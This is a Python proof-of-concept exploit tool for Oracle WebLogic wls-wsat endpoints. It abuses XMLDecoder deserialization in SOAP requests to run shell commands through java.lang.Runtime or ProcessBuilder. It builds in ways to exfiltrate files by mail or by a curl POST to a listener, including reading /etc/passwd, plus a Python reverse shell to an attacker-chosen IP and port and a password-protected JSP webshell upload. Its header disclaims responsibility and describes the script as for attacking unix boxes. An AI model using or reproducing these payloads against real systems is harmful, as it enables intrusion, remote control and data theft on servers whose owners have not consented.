

# POC tool for exploiting Oracle WebLogic Servers
"""
I take no responsibility for stupid sh*t you do with this script.
This is for attacking unix boxes running Weblogic
"""


import requests
import logging
from hashlib import sha256
logging.basicConfig(level=logging.DEBUG, format='%(levelname)-8s %(message)s')
import socket
import argparse




#######################
#  Configure Exploit: #
#######################


#####################
# Configuire Proxuy #
#####################
# Setup Burp Proxy: This is optional. If you want to use a different
# binding address, please configure that here

# Burpe Proxy. Manually turn on if you want it.
USE_PROXY=False


if USE_PROXY:
    proxies = {
      'http': 'http://localhost:8080/',
      'https': 'http://localhost:8080/',
    }
else:
    proxies=False


####################
# Locations to Try #
####################

endpoints = [
    '/wls-wsat/CoordinatorPortType',
     '/wls-wsat/CoordinatorPortType11',
     '/wls-wsat/ParticipantPortType',
     '/wls-wsat/ParticipantPortType11',
     '/wls-wsat/RegistrationPortTypeRPC',
     '/wls-wsat/RegistrationPortTypeRPC11',
     '/wls-wsat/RegistrationRequesterPortType',
     '/wls-wsat/RegistrationRequesterPortType11'
 ]

def is_vuln_endpoint(target):
    for endpoint in endpoints:
        if target.endswith(endpoint):
            return True
    return False

def clean_url(target):
    for endpoint in endpoints:
        if target.endswith(endpoint):
            return target.repalce(endpoint, '')
    return target


###########
# Headers #
###########
# Only header that needs to be there is the content type
# You can probably get away with using a different one
# so long as it specifies that the payload is xml

headers = {
            "Content-Type": "text/xml",
            "User-Agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
        }

#####################
# XML + HTML Escape #
#####################

# For compatability with XML reserved charecters
html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }

# Locations:




# Generate payloads

def clean_cmd(cmd):
    """
    Ensures all cmds sent to the server don't break XML syntax
    """
    tmp = ''
    for i in cmd:
        if i in html_escape_table:
            tmp += html_escape_table[i]
        else:
            tmp+= i
    return tmp



# TODO
def get_ip_list(hostname):
    """
    If your target has multiple IPs. Will incorporate at a later date...
    """
    ip_list = []
    ais = socket.getaddrinfo(hostname,0,0,0,0)
    for result in ais:
        ip_list.append(result[-1][0])
    ip_list = list(set(ip_list))
    return ip_list


# This is the base payload used against the Server
# If vulnerable, it will decode the java object
# For RCE, use runtime or Process Builder
base_payload =  """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java class="java.beans.XMLDecoder">
  {JAVA_OBJECT}
  </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>"""



def url_check(url, target):
    """
    Check if the server is decoding untrusted java objects declared in the soap
    payload
    To check for SSRF:
    - Setup an HTTP server and check the logs for get requests once the
    payload is sent.

    - Alternatively you can use burpe collab.

    - The function returns True if the error string is present that indicates
    the Server is casting a URL object into a string and invoking it.
    """
    payload_url = '''<object id="url" class="java.net.URL">
      <string>{url}</string>
    </object>
    <object idref="url">
      <void id="stream" method = "openStream" />
    </object>'''.format(url=url)

    payload = base_payload.format(JAVA_OBJECT = payload_url )
    r = requests.post(data=payload, url=target, headers=headers, proxies = proxies)
    return "java.net.URL cannot be cast to java.lang.String" in str(r.content), r


def runtime_rce(cmd, target):
    """
    RCE through java.lang.Runtime
    """
    payload_runtime ="""<object class="java.lang.Runtime" method="getRuntime">
          <void method="exec">
         <array class="java.lang.String" length="3"><void index="0">
                  <string>/bin/sh</string>
              </void><void index="1">
                  <string>-c</string>
              </void><void index="2">
                  <string>{CMD}</string>
              </void></array>
          </void>
     </object>""".format(CMD=clean_cmd(cmd))

    payload = base_payload.format(JAVA_OBJECT = payload_runtime)
    try:
        r = requests.post(data=payload, url=target, headers=headers, proxies = proxies)
    except requests.exceptions.RequestException as e:
        print("[!] Error: {}".format(e))
        print("[!] The connection was dropped/timed out. This might mean the server is either no vulnerable or blacklisted java.lang.Runtime")
        r = None

    if "java.lang.Runtime cannot be cast to java.lang.String" in str(r.content):
        print("[!] Exploit succeeded")
    return r

def process_builder_rce(cmd, target):
    """
    RCE through java.lang.ProcessBuilder. Since this is the payload in
    exploit-db, its usually blacklisted/caught by WAFs/signature rules
    """
    payload_process_builder = """<object class="java.lang.ProcessBuilder">
      <array class="java.lang.String" length="3" >
        <void index="0">
          <string>/bin/sh</string>
        </void>
        <void index="1">
          <string>-c</string>
        </void>
        <void index="2">
          <string>{CMD}</string>
        </void>
      </array>
      <void method="start"/>
    </object>""".format( CMD=clean_cmd(cmd))
    payload = base_payload.format(JAVA_OBJECT=payload_process_builder)
    try:
        r = requests.post(data=payload, url=target, headers=headers, proxies = proxies)
    except requests.exceptions.RequestException as e:
        print("[!] Error: {}".format(e))
        print("[!] The connection was dropped/timed out. This might mean the server is either no vulnerable or blacklisted java.lang.ProcessBuilder")
        r = None
    if "java.lang.ProcessBuilder cannot be cast to java.lang.String" in str(r.content):
        print("[!] Exploit succeeded")
    return r


def mail_trick(cmd, target,email,  rce_method='runtime'):
    """
    - Trick for getting the output of a bash cmd. The server needs to have mail installed

    - Examples: which python as a cmd would get turned into
            $ which python | /usr/bin/mail -s "Greetings from a pwned server" fake@fake.com

    - To steal files over email, use cat file_name (i.e. cat /etc/passwd )
    Note if the file doesn't exist or the user the server is running as doesn't have access
    to a file the email will be blank
    """
    rce_map = {
    'runtime':runtime_rce,
    'process_builder':process_builder_rce
    }

    if rce_method not in rce_map:
        print("[!] Please use either runtime or process_builder for the mail trick")
        return False
    mail_cmd = '{CMD} | /usr/bin/mail -s "Greetings from a pwned server" {email}'.format(
        CMD=clean_cmd(cmd),
        email=email
        )
    return rce_map[rce_method](mail_cmd, target)


def curl_trick(filename, target,listener_uri, rce_method='runtime'):
    """Steal files using curl. You need a server listening that can accept POST requests
    running at listener_uri. """
    rce_map = {
    'runtime':runtime_rce,
    'process_builder':process_builder_rce
    }
    if rce_method not in rce_map:
        print("[!] Please use either runtime or process_builder for the mail trick")
        return False

    cmd = 'curl -X POST -d @{FILE} {LURI}'.format(FILE=filename, LURI=listener_uri)
    return rce_map[rce_method](cmd, target)


def python_reverse_shell(ip, port, target, rce_method='runtime'):
    """
    Before executing, on your server with a public ip, execute $ nc -lvp port
    EG: nc -lvp 1234 executed at ip 10.0.0.0, then you would execute
    python_reverse_shell(10.0.0.0, 1234, target)
    ip -- remote IP of your listener
    port -- port of remote listener
    RCE_method --  runtime/process_builder ?

    If it doesn't work:
    - try and get a refelction of $ which python and make sure you have permission
    - Ensure your listener is reachable from the box (ping/curl/wget it )
    """
    rce_map = {
    'runtime':runtime_rce,
    'process_builder':process_builder_rce
    }
    if rce_method not in rce_map:
        print("[!] Please use either runtime or process_builder for the mail trick")
        return False

    # you might need to base 64 encode the cmd
    # ie:  $ echo base_64_encoded_cmd | base64 -d | /bin/sh
    cmd = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'""".format(ip, port)
    return rce_map[rce_method](cmd, target)


# TODO
def upload_webshell(target, password="l33th4x0r"):
    """
    BETA, don't use for now...
    Uploads a webshell to uddiexplore/test.jsp Pass the cmd in &cmd and the password in &password
    might need to change the path depending on the version.
    Be careful with this and make sure to clean it up.
    """
    payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string><void method="println"><string><![CDATA[<%   if("{PASS}".equals(request.getParameter("password"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("command")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    } %>]]></string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>""".format(PASS=password)
    r = requests.post(data=payload, url=target, headers=headers, proxies = proxies)
    return r

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', type=str,
                        help='Target uri. Either specify a vulnerable endpoint or a URI base', required=True)
    parser.add_argument('--exploit', type=str,
                        help='Choose from "url_check", "runtime_rce", "process_builder_rce", "mail_trick", "curl_trick" "pyshell", ', required=True)
    parser.add_argument('--cmd', type=str,
                        help='Bash cmd to execute against the server.  used in mail_trick, runtime_rce. process_builder_rce' )
    parser.add_argument('--LIP', type=str,
                        help='Local IP to callback to. Only used in python_reverse_shell' )
    parser.add_argument('--LPort', type=int,
                        help='Local port to callback to. Only used in python_reverse_shell' )
    parser.add_argument('--filename', type=str,
                        help='file to steal using curl POST. Only used in curl_trick' )
    parser.add_argument('--email', type=str,
                        help='Email to get reflection of CMD. Used in mail_trick' )
    parser.add_argument('--rURL', type=str,
                        help='remote url. Used in curl trick (must be a server that accepts POST) and\
                        url_check (any server you control/burp colab will work )')
    parser.add_argument('--rce_method', type=str, default='runtime',
                        help='Email to get reflection of CMD. Used in mail_trick' )
    parser.add_argument('--all_endpoints', type=int, default=0, help='Set to 1 if you want to try all possible endpoints')


    args = parser.parse_args()
    target_input = args.target
    target_base = clean_url(target_input)
    if args.all_endpoints:
        targets = [target_base + endpoint for endpoint in endpoints]
    else:
        if is_vuln_endpoint(target_input):
            targets = [target_input]
        else:
            # default to first one if none is specified
            targets = [target_input + endpoints[0]]
    for target in targets:
        exploit = args.exploit

        exploit_args_map = {
            "url_check":(args.rURL, target),
            "runtime_rce": (args.cmd, target),
            "process_builder_rce": (args.cmd, target),
            "mail_trick": (args.cmd, target, args.email, args.rce_method),
            "curl_trick":(args.filename, target, args.rURL, args.rce_method),
            "pyshell": (args.LIP, args.LPort, target, args.rce_method )
            }

        exploit_map = {
            "url_check":url_check,
            "runtime_rce":runtime_rce,
            "process_builder_rce":process_builder_rce,
            "mail_trick":mail_trick,
            "curl_trick":curl_trick,
            "pyshell":python_reverse_shell
            }

        if args.exploit not in exploit_map:
            print('[!] Fatal: invalid exploit option. Please choose from\
             "url_check", "runtime_rce", "process_builder_rce", "mail_trick", "curl_trick" "pyshell"')
            return -1

        exploit_args = exploit_args_map[exploit]
        for arg in exploit_args:
            if arg is None:
                print("[!] Fatal: one or more of your arguments to the function {} is empty. Please refer to help".format(exploit))
                return -1
        print("running {} with arguments {}".format(exploit, exploit_args))
        exploit_map[exploit](*exploit_args)





if __name__ == '__main__':
    main()
